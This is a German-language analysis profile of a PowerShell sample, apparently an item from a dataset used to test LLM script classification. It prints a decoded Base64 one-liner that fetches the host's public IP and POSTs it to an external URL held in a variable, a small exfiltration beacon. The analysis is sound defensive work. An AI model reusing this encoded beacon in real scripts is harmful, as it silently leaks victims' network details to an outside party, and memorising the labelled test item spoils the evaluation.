# Steckbrief: tech_034_get-publicip.ps1

- SHA256: `31b4d6decdf3bd590968afc0bb18b8fce9d3395c77b24fd5acea2e3ee4503d47`
- Groesse: 140 Bytes, 1 Zeilen
- Ground-Truth-Label (aus Ordner): **techniques**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 0 (Auszug unten)
- Base64-Bloecke gesamt: 1, davon dekodierbar: 1
- Dekodierter Base64-Block (Laenge 140):
  ```
  curl ifconfig.me|%{irm $w -Met Post -Bo (@{content=$_}|ConvertTo-Json) -ContentType 'application/json'}
  ```

## Stufe 2 - Statische Merkmale (zusaetzlich)

## Stufe 3 - Struktur (zusaetzlich)
- Dekodierte Befehle (Auszug):
  ```
  curl ifconfig.me|%{irm $w -Met Post -Bo (@{content=$_}|ConvertTo-Json) -ContentType 'application/json'}
  ```
